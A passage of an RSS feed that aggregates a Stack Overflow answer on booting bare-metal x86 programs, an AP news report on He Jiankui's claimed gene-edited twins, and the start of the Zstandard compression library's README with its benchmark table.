&lt;p&gt;link.ld&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;SECTIONS
{
    . = 0x7c00;
    .text :
    {
        __start = .;
        *(.text)
        . = 0x1FE;
        SHORT(0xAA55)
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Assemble and link with:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;gcc -c -g -o main.o main.S
ld --oformat binary -o main.img -T linker.ld main.o
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Outcome:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/auien.jpg&quot; rel=&quot;noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/auien.jpg&quot; alt=&quot;enter image description here&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Tested on: Lenovo Thinkpad T430, UEFI BIOS 1.16. Disk generated on an Ubuntu 18.04 host.&lt;/p&gt;
&lt;p&gt;Besides the standard userland assembly instructions, we have:&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;.code16&lt;/code&gt;: tells GAS to output 16-bit code&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;cli&lt;/code&gt;: disable software interrupts. Those could make the processor start running again after the &lt;code&gt;hlt&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;int $0x10&lt;/code&gt;: does a BIOS call. This is what prints the characters one by one.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The important link flags are:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;--oformat binary&lt;/code&gt;: output raw binary assembly code, don't warp it inside an ELF file as is the case for regular userland executables.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Cooler x86 bare metal programs&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Here are a few cooler baremetal setups that I've achieved:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Use C instead of assembly&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Since C compiles to assembly, using C without the standard library is pretty simple, you basically just need:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;a linker script to put things in memory at the right place&lt;/li&gt;
&lt;li&gt;flags that tell GCC not to use the standard library&lt;/li&gt;
&lt;li&gt;a tiny assembly entry point that sets required C state for &lt;code&gt;main&lt;/code&gt;, notably:
&lt;ul&gt;&lt;li&gt;the stack&lt;/li&gt;
&lt;li&gt;zero out BSS&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;TODO: link so some x86 example on GitHub. &lt;a href=&quot;https://github.com/cirosantilli/linux-kernel-module-cheat/tree/54e15e04338c0fecc0be139a0da2d0d972c21419#baremetal-setup-getting-started&quot; rel=&quot;noreferrer&quot;&gt;Here is an ARM one I've created&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Things get more fun if you want to use the standard library however, since we don't have the Linux kernel, which implements much of the C standard library functionality &lt;a href=&quot;https://stackoverflow.com/questions/1780599/what-is-the-meaning-of-posix/31865755#31865755&quot;&gt;through POSIX&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A few possibilities, without going to a full-blown OS like Linux, include:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ARM&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In ARM, the general ideas are the same. I have uploaded:&lt;/p&gt;
&lt;p&gt;For the Raspberry Pi, &lt;a href=&quot;https://github.com/dwelch67/raspberrypi&quot; rel=&quot;noreferrer&quot;&gt;https://github.com/dwelch67/raspberrypi&lt;/a&gt; looks like the most popular tutorial available today.&lt;/p&gt;
&lt;p&gt;Some differences from x86 include:&lt;/p&gt;
&lt;ul readability=&quot;3.3145695364238&quot;&gt;&lt;li readability=&quot;1.7333333333333&quot;&gt;
&lt;p&gt;IO is done by writing to magic addresses directly, there is no &lt;code&gt;in&lt;/code&gt; and &lt;code&gt;out&lt;/code&gt; instructions.&lt;/p&gt;
&lt;p&gt;This is called &lt;a href=&quot;https://stackoverflow.com/questions/3890484/what-is-the-difference-between-memory-mapped-io-and-io-mapped-io&quot;&gt;memory mapped IO&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;5&quot;&gt;
&lt;p&gt;for some real hardware, like the Raspberry Pi, you can add the firmware (BIOS) yourself to the disk image.&lt;/p&gt;
&lt;p&gt;That is a good thing, as it makes updating that firmware more transparent.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Firmware&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In truth, your boot sector is not the first software that runs on the system's CPU.&lt;/p&gt;
&lt;p&gt;What actually runs first is the so-called &lt;em&gt;firmware&lt;/em&gt;, which is a software:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;made by the hardware manufacturers&lt;/li&gt;
&lt;li&gt;typically closed source but likely C-based&lt;/li&gt;
&lt;li&gt;stored in read-only memory, and therefore harder / impossible to modify without the vendor's consent.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Well known firmwares include:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/BIOS&quot; rel=&quot;noreferrer&quot;&gt;BIOS&lt;/a&gt;: old all-present x86 firmware. SeaBIOS is the default open source implementation used by QEMU.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://wiki.osdev.org/UEFI&quot; rel=&quot;noreferrer&quot;&gt;UEFI&lt;/a&gt;: BIOS successor, better standardized, but more capable, and incredibly bloated.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Coreboot&quot; rel=&quot;noreferrer&quot;&gt;Coreboot&lt;/a&gt;: the noble cross arch open source attempt&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The firmware does things like:&lt;/p&gt;
&lt;ul readability=&quot;6&quot;&gt;&lt;li readability=&quot;9&quot;&gt;
&lt;p&gt;loop over each hard disk, USB, network, etc. until you find something bootable.&lt;/p&gt;
&lt;p&gt;When we run QEMU, &lt;code&gt;-hda&lt;/code&gt; says that &lt;code&gt;main.img&lt;/code&gt; is a hard disk connected to the hardware, and&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hda&lt;/code&gt; is the first one to be tried, and it is used.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;load the first 512 bytes to RAM memory address &lt;code&gt;0x7c00&lt;/code&gt;, put the CPU's RIP there, and let it run&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;show things like the boot menu or BIOS print calls on the display&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Firmware offers OS-like functionality on which most OS-es depend. E.g. a Python subset has been ported to run on BIOS / UEFI: &lt;a href=&quot;https://www.youtube.com/watch?v=bYQ_lq5dcvM&quot; rel=&quot;noreferrer&quot;&gt;https://www.youtube.com/watch?v=bYQ_lq5dcvM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It can be argued that firmwares are indistinguishable from OSes, and that firmware is the only &quot;true&quot; bare metal programming one can do.&lt;/p&gt;
&lt;p&gt;As this &lt;a href=&quot;https://lennartb.home.xs4all.nl/coreboot/col3.html&quot; rel=&quot;noreferrer&quot;&gt;CoreOS dev puts it&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote readability=&quot;22&quot;&gt;
&lt;p&gt;The hard part&lt;/p&gt;
&lt;p&gt;When you power up a PC, the chips that make up the chipset (northbridge, southbridge and SuperIO) are not yet initialized properly. Even though the BIOS ROM is as far removed from the CPU as it could be, this is accessible by the CPU, because it has to be, otherwise the CPU would have no instructions to execute. This does not mean that BIOS ROM is completely mapped, usually not. But just enough is mapped to get the boot process going. Any other devices, just forget it.&lt;/p&gt;
&lt;p&gt;When you run Coreboot under QEMU, you can experiment with the higher layers of Coreboot and with payloads, but QEMU offers little opportunity to experiment with the low level startup code. For one thing, RAM just works right from the start.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Post BIOS initial state&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Like many things in hardware, standardization is weak, and one of the things you should &lt;em&gt;not&lt;/em&gt; rely on is the initial state of registers when your code starts running after BIOS.&lt;/p&gt;
&lt;p&gt;So do yourself a favor and use some initialization code like the following: &lt;a href=&quot;https://stackoverflow.com/a/32509555/895245&quot;&gt;https://stackoverflow.com/a/32509555/895245&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Registers like &lt;code&gt;%ds&lt;/code&gt; and &lt;code&gt;%es&lt;/code&gt; have important side effects, so you should zero them out even if you are not using them explicitly.&lt;/p&gt;
&lt;p&gt;Note that some emulators are nicer than real hardware and give you a nice initial state. Then when you go run on real hardware, everything breaks.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GNU GRUB Multiboot&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Boot sectors are simple, but they are not very convenient:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;you can only have one OS per disk&lt;/li&gt;
&lt;li&gt;the load code has to be really small and fit into 512 bytes. This could be solved with the &lt;a href=&quot;https://github.com/cirosantilli/x86-bare-metal-examples/blob/893fdba02c795917c40de17d77220db0115f23fa/bios_disk_load.S&quot; rel=&quot;noreferrer&quot;&gt;int 0x13 BIOS call&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;you have to do a lot of startup yourself, like moving into protected mode&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;It is for those reasons that &lt;a href=&quot;https://en.wikipedia.org/wiki/GNU_GRUB&quot; rel=&quot;noreferrer&quot;&gt;GNU GRUB&lt;/a&gt; created a more convenient file format called multiboot.&lt;/p&gt;
&lt;p&gt;Minimal working example: &lt;a href=&quot;https://github.com/cirosantilli/x86-bare-metal-examples/tree/d217b180be4220a0b4a453f31275d38e697a99e0/multiboot/hello-world&quot; rel=&quot;noreferrer&quot;&gt;https://github.com/cirosantilli/x86-bare-metal-examples/tree/d217b180be4220a0b4a453f31275d38e697a99e0/multiboot/hello-world&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I also use it on my &lt;a href=&quot;https://github.com/cirosantilli/x86-bare-metal-examples/tree/a2ca298afe704b0b9e94cd39edb924094034cc54#getting-started-with-the-big-image&quot; rel=&quot;noreferrer&quot;&gt;GitHub examples repo&lt;/a&gt; to be able to easily run all examples on real hardware without burning the USB a million times. On QEMU it looks like this:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/zWfWl.png&quot; rel=&quot;noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/zWfWl.png&quot; alt=&quot;enter image description here&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If you prepare your OS as a multiboot file, GRUB is then able to find it inside a regular filesystem.&lt;/p&gt;
&lt;p&gt;This is what most distros do, putting OS images under &lt;code&gt;/boot&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Multiboot files are basically an ELF file with a special header. They are specified by GRUB at: &lt;a href=&quot;https://www.gnu.org/software/grub/manual/multiboot/multiboot.html&quot; rel=&quot;noreferrer&quot;&gt;https://www.gnu.org/software/grub/manual/multiboot/multiboot.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You can turn a multiboot file into a bootable disk with &lt;code&gt;grub-mkrescue&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;El Torito&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Format that can be burnt to CDs: &lt;a href=&quot;https://en.wikipedia.org/wiki/El_Torito_%28CD-ROM_standard%29&quot; rel=&quot;noreferrer&quot;&gt;https://en.wikipedia.org/wiki/El_Torito_%28CD-ROM_standard%29&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It is also possible to produce a hybrid image that works on either ISO or USB. This is can be done with &lt;code&gt;grub-mkrescue&lt;/code&gt; (&lt;a href=&quot;https://github.com/cirosantilli/x86-bare-metal-examples/blob/d217b180be4220a0b4a453f31275d38e697a99e0/multiboot/hello-world/Makefile#L6&quot; rel=&quot;noreferrer&quot;&gt;example&lt;/a&gt;), and is also done by the Linux kernel on &lt;code&gt;make isoimage&lt;/code&gt; using &lt;code&gt;isohybrid&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Resources&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 26 Nov 2018 05:50:23 +0000</pubDate>
<dc:creator>Cieplak</dc:creator>
<og:type>website</og:type>
<og:url>https://stackoverflow.com/questions/22054578/how-to-run-a-program-without-an-operating-system/32483545</og:url>
<og:image>https://cdn.sstatic.net/Sites/stackoverflow/img/apple-touch-icon@2.png?v=73d79a89bded</og:image>
<og:title>How to run a program without an operating system?</og:title>
<og:description>How do you run a program all by itself without an operating system running? Can you create assembly programs that the computer can load and run at startup, e.g. boot the computer from a flash drive...</og:description>
<dc:format>text/html</dc:format>
<dc:identifier>https://stackoverflow.com/questions/22054578/how-to-run-a-program-without-an-operating-system/32483545</dc:identifier>
</item>
<item>
<title>First gene-edited babies claimed in China</title>
<link>http://mainichi.jp/english/articles/20181126/p2g/00m/0fe/047000c</link>
<guid isPermaLink="true" >http://mainichi.jp/english/articles/20181126/p2g/00m/0fe/047000c</guid>
<description>&lt;div class=&quot;img-left&quot; readability=&quot;11&quot;&gt;
&lt;div class=&quot;img&quot;&gt;&lt;a data-href=&quot;https://cdn.mainichi.jp/vol1/2018/11/26/20181126p2g00m0in050000p/9.jpg?1&quot; data-lightbox=&quot;photos&quot; data-title=&quot;In this Oct. 9, 2018 photo, an embryo receives a small dose of Cas9 protein and PCSK9 sgRNA in a sperm injection microscope in a laboratory in Shenzhen in southern China's Guangdong province. (AP Photo/Mark Schiefelbein)&quot;&gt;&lt;span class=&quot;wrap&quot;&gt;&lt;img src=&quot;https://cdn.mainichi.jp/vol1/2018/11/26/20181126p2g00m0in050000p/6.jpg?1&quot; alt=&quot;&quot; class=&quot;horizontal-photo&quot;/&gt;&lt;/span&gt;&lt;/a&gt;


&lt;/div&gt;
In this Oct. 9, 2018 photo, an embryo receives a small dose of Cas9 protein and PCSK9 sgRNA in a sperm injection microscope in a laboratory in Shenzhen in southern China's Guangdong province. (AP Photo/Mark Schiefelbein)&lt;/div&gt;
&lt;p class=&quot;txt&quot;&gt;HONG KONG (AP) -- A Chinese researcher claims that he helped make the world's first genetically edited babies -- twin girls whose DNA he said he altered with a powerful new tool capable of rewriting the very blueprint of life.&lt;/p&gt;

&lt;p class=&quot;txt&quot;&gt;If true, it would be a profound leap of science and ethics.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;A U.S. scientist said he took part in the work in China, but this kind of gene editing is banned in the United States because the DNA changes can pass to future generations and it risks harming other genes.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Many mainstream scientists think it's too unsafe to try, and some denounced the Chinese report as human experimentation.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;The researcher, He Jiankui of Shenzhen, said he altered embryos for seven couples during fertility treatments, with one pregnancy resulting thus far. He said his goal was not to cure or prevent an inherited disease, but to try to bestow a trait that few people naturally have -- an ability to resist possible future infection with HIV, the AIDS virus.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;He said the parents involved declined to be identified or interviewed, and he would not say where they live or where the work was done.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;There is no independent confirmation of He's claim, and it has not been published in a journal, where it would be vetted by other experts. He revealed it Monday in Hong Kong to one of the organizers of an international conference on gene editing that is set to begin Tuesday, and earlier in exclusive interviews with The Associated Press.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;&quot;I feel a strong responsibility that it's not just to make a first, but also make it an example,&quot; He told the AP. &quot;Society will decide what to do next&quot; in terms of allowing or forbidding such science.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Some scientists were astounded to hear of the claim and strongly condemned it.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;It's &quot;unconscionable ... an experiment on human beings that is not morally or ethically defensible,&quot; said Dr. Kiran Musunuru, a University of Pennsylvania gene editing expert and editor of a genetics journal.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;&quot;This is far too premature,&quot; said Dr. Eric Topol, who heads the Scripps Research Translational Institute in California. &quot;We're dealing with the operating instructions of a human being. It's a big deal.&quot;&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;However, one famed geneticist, Harvard University's George Church, defended attempting gene editing for HIV, which he called &quot;a major and growing public health threat.&quot;&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;&quot;I think this is justifiable,&quot; Church said of that goal.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;In recent years scientists have discovered a relatively easy way to edit genes, the strands of DNA that govern the body. The tool, called CRISPR-cas9, makes it possible to operate on DNA to supply a needed gene or disable one that's causing problems.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;It's only recently been tried in adults to treat deadly diseases, and the changes are confined to that person. Editing sperm, eggs or embryos is different -- the changes can be inherited. In the U.S., it's not allowed except for lab research. China outlaws human cloning but not specifically gene editing.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;He Jiankui (HEH JEE'-an-qway), who goes by &quot;JK,&quot; studied at Rice and Stanford universities in the U.S. before returning to his homeland to open a lab at Southern University of Science and Technology of China in Shenzhen, where he also has two genetics companies.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;The U.S. scientist who worked with him on this project after He returned to China was physics and bioengineering professor Michael Deem, who was his adviser at Rice in Houston. Deem also holds what he called &quot;a small stake&quot; in -- and is on the scientific advisory boards of -- He's two companies.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;The Chinese researcher said he practiced editing mice, monkey and human embryos in the lab for several years and has applied for patents on his methods.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;He said he chose to try embryo gene editing for HIV because these infections are a big problem in China. He sought to disable a gene called CCR5 that forms a protein doorway that allows HIV, the virus that causes AIDS, to enter a cell.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;All of the men in the project had HIV and all of the women did not, but the gene editing was not aimed at preventing the small risk of transmission, He said. The fathers had their infections deeply suppressed by standard HIV medicines and there are simple ways to keep them from infecting offspring that do not involve altering genes.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Instead, the appeal was to offer couples affected by HIV a chance to have a child that might be protected from a similar fate.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;He recruited couples through a Beijing-based AIDS advocacy group called Baihualin. Its leader, known by the pseudonym &quot;Bai Hua,&quot; told the AP that it's not uncommon for people with HIV to lose jobs or have trouble getting medical care if their infections are revealed.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Here is how He described the work:&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;The gene editing occurred during IVF, or lab dish fertilization. First, sperm was &quot;washed&quot; to separate it from semen, the fluid where HIV can lurk. A single sperm was placed into a single egg to create an embryo. Then the gene editing tool was added.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;When the embryos were 3 to 5 days old, a few cells were removed and checked for editing. Couples could choose whether to use edited or unedited embryos for pregnancy attempts. In all, 16 of 22 embryos were edited, and 11 embryos were used in six implant attempts before the twin pregnancy was achieved, He said.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Tests suggest that one twin had both copies of the intended gene altered and the other twin had just one altered, with no evidence of harm to other genes, He said. People with one copy of the gene can still get HIV, although some very limited research suggests their health might decline more slowly once they do.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Several scientists reviewed materials that He provided to the AP and said tests so far are insufficient to say the editing worked or to rule out harm.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;They also noted evidence that the editing was incomplete and that at least one twin appears to be a patchwork of cells with various changes.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;&quot;It's almost like not editing at all&quot; if only some of certain cells were altered, because HIV infection can still occur, Church said.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Church and Musunuru questioned the decision to allow one of the embryos to be used in a pregnancy attempt, because the Chinese researchers said they knew in advance that both copies of the intended gene had not been altered.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;&quot;In that child, there really was almost nothing to be gained in terms of protection against HIV and yet you're exposing that child to all the unknown safety risks,&quot; Musunuru said.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;The use of that embryo suggests that the researchers' &quot;main emphasis was on testing editing rather than avoiding this disease,&quot; Church said.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Even if editing worked perfectly, people without normal CCR5 genes face higher risks of getting certain other viruses, such as West Nile, and of dying from the flu. Since there are many ways to prevent HIV infection and it's very treatable if it occurs, those other medical risks are a concern, Musunuru said.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;There also are questions about the way He said he proceeded. He gave official notice of his work long after he said he started it -- on Nov. 8, on a Chinese registry of clinical trials.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;It's unclear whether participants fully understood the purpose and potential risks and benefits. For example, consent forms called the project an &quot;AIDS vaccine development&quot; program.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;The Rice scientist, Deem, said he was present in China when potential participants gave their consent and that he &quot;absolutely&quot; thinks they were able to understand the risks.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Deem said he worked with He on vaccine research at Rice and considers the gene editing similar to a vaccine.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;&quot;That might be a layman's way of describing it,&quot; he said.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Both men are physics experts with no experience running human clinical trials.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;The Chinese scientist, He, said he personally made the goals clear and told participants that embryo gene editing has never been tried before and carries risks. He said he also would provide insurance coverage for any children conceived through the project and plans medical followup until the children are 18 and longer if they agree once they're adults.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Further pregnancy attempts are on hold until the safety of this one is analyzed and experts in the field weigh in, but participants were not told in advance that they might not have a chance to try what they signed up for once a &quot;first&quot; was achieved, He acknowledged. Free fertility treatment was part of the deal they were offered.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;He sought and received approval for his project from Shenzhen Harmonicare Women's and Children's Hospital, which is not one of the four hospitals that He said provided embryos for his research or the pregnancy attempts.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Some staff at some of the other hospitals were kept in the dark about the nature of the research, which He and Deem said was done to keep some participants' HIV infection from being disclosed.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;&quot;We think this is ethical,&quot; said Lin Zhitong, a Harmonicare administrator who heads the ethics panel.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;Any medical staff who handled samples that might contain HIV were aware, He said. An embryologist in He's lab, Qin Jinzhou, confirmed to the AP that he did sperm washing and injected the gene editing tool in some of the pregnancy attempts.&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;The study participants are not ethicists, He said, but &quot;are as much authorities on what is correct and what is wrong because it's their life on the line.&quot;&lt;/p&gt;
&lt;p class=&quot;txt&quot;&gt;&quot;I believe this is going to help the families and their children,&quot; He said. If it causes unwanted side effects or harm, &quot;I would feel the same pain as they do and it's going to be my own responsibility.&quot;&lt;/p&gt;

</description>
<pubDate>Mon, 26 Nov 2018 03:48:38 +0000</pubDate>
<dc:creator>sjreese</dc:creator>
<og:title>First gene-edited babies claimed in China - The Mainichi</og:title>
<og:type>article</og:type>
<og:url>https://mainichi.jp/english/articles/20181126/p2g/00m/0fe/047000c</og:url>
<og:description>HONG KONG (AP) -- A Chinese researcher claims that he helped make the world's first genetically edited babies -- twin girls whose DNA he said he alter</og:description>
<og:image>https://cdn.mainichi.jp/vol1/2018/11/26/20181126p2g00m0in049000p/0c8.jpg?2</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://mainichi.jp/english/articles/20181126/p2g/00m/0fe/047000c</dc:identifier>
</item>
<item>
<title>Zstandard – Fast real-time compression algorithm</title>
<link>https://github.com/facebook/zstd</link>
<guid isPermaLink="true" >https://github.com/facebook/zstd</guid>
<description>&lt;div class=&quot;Box-body p-6&quot;&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;&lt;p align=&quot;center&quot;&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://raw.githubusercontent.com/facebook/zstd/dev/doc/images/zstd_logo86.png&quot;&gt;&lt;img src=&quot;https://raw.githubusercontent.com/facebook/zstd/dev/doc/images/zstd_logo86.png&quot; alt=&quot;Zstandard&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Zstandard&lt;/strong&gt;, or &lt;code&gt;zstd&lt;/code&gt; as short version, is a fast lossless compression algorithm, targeting real-time compression scenarios at zlib-level and better compression ratios. It's backed by a very fast entropy stage, provided by &lt;a href=&quot;https://github.com/Cyan4973/FiniteStateEntropy&quot;&gt;Huff0 and FSE library&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The project is provided as an open-source dual &lt;a href=&quot;https://github.com/facebook/zstd/blob/dev/LICENSE&quot;&gt;BSD&lt;/a&gt; and &lt;a href=&quot;https://github.com/facebook/zstd/blob/dev/COPYING&quot;&gt;GPLv2&lt;/a&gt; licensed &lt;strong&gt;C&lt;/strong&gt; library, and a command line utility producing and decoding &lt;code&gt;.zst&lt;/code&gt;, &lt;code&gt;.gz&lt;/code&gt;, &lt;code&gt;.xz&lt;/code&gt; and &lt;code&gt;.lz4&lt;/code&gt; files. Should your project require another programming language, a list of known ports and bindings is provided on &lt;a href=&quot;http://www.zstd.net/#other-languages&quot; rel=&quot;nofollow&quot;&gt;Zstandard homepage&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Development branch status : &lt;a href=&quot;https://travis-ci.org/facebook/zstd&quot; rel=&quot;nofollow&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/9b5d141da23951adb465b2975ee9550048c703b9/68747470733a2f2f7472617669732d63692e6f72672f66616365626f6f6b2f7a7374642e7376673f6272616e63683d646576&quot; alt=&quot;Build Status&quot; title=&quot;Continuous Integration test suite&quot; data-canonical-src=&quot;https://travis-ci.org/facebook/zstd.svg?branch=dev&quot;/&gt;&lt;/a&gt; &lt;a href=&quot;https://ci.appveyor.com/project/YannCollet/zstd-p0yf0&quot; rel=&quot;nofollow&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/24c1b80141c393a1de83716b92268d9dabc02d69/68747470733a2f2f63692e6170707665796f722e636f6d2f6170692f70726f6a656374732f7374617475732f78743338776264786a6b356d7262656d2f6272616e63682f6465763f7376673d74727565&quot; alt=&quot;Build status&quot; title=&quot;Windows test suite&quot; data-canonical-src=&quot;https://ci.appveyor.com/api/projects/status/xt38wbdxjk5mrbem/branch/dev?svg=true&quot;/&gt;&lt;/a&gt; &lt;a href=&quot;https://circleci.com/gh/facebook/zstd&quot; rel=&quot;nofollow&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/17a2aa1bae71dd23de1e50ce454a985b26f08910/68747470733a2f2f636972636c6563692e636f6d2f67682f66616365626f6f6b2f7a7374642f747265652f6465762e7376673f7374796c653d736869656c64&quot; alt=&quot;Build status&quot; title=&quot;Short test suite&quot; data-canonical-src=&quot;https://circleci.com/gh/facebook/zstd/tree/dev.svg?style=shield&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Benchmarks&lt;/h3&gt;
&lt;p&gt;For reference, several fast compression algorithms were tested and compared on a server running Linux Debian (&lt;code&gt;Linux version 4.14.0-3-amd64&lt;/code&gt;), with a Core i7-6700K CPU @ 4.0GHz, using &lt;a href=&quot;https://github.com/inikep/lzbench&quot;&gt;lzbench&lt;/a&gt;, an open-source in-memory benchmark by @inikep compiled with &lt;a href=&quot;https://gcc.gnu.org/&quot; rel=&quot;nofollow&quot;&gt;gcc&lt;/a&gt; 7.3.0, on the &lt;a href=&quot;http://sun.aei.polsl.pl/~sdeor/index.php?page=silesia&quot; rel=&quot;nofollow&quot;&gt;Silesia compression corpus&lt;/a&gt;.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Compressor name&lt;/th&gt;
&lt;th&gt;Ratio&lt;/th&gt;
&lt;th&gt;Compression&lt;/th&gt;
&lt;th&gt;Decompress.&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;zstd 1.3.4 -1&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;2.877&lt;/td&gt;
&lt;td&gt;470 MB/s&lt;/td&gt;
&lt;td&gt;1380 MB/s&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;zlib 1.2.11 -1&lt;/td&gt;
&lt;td&gt;2.743&lt;/td&gt;
&lt;td&gt;110 MB/s&lt;/td&gt;
&lt;td&gt;400 MB/s&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;brotli 1.0.2 -0&lt;/td&gt;
&lt;td&gt;2.701&lt;/td&gt;
&lt;td&gt;410 MB/s&lt;/td&gt;
&lt;td&gt;430 MB/s&lt;/td&gt;
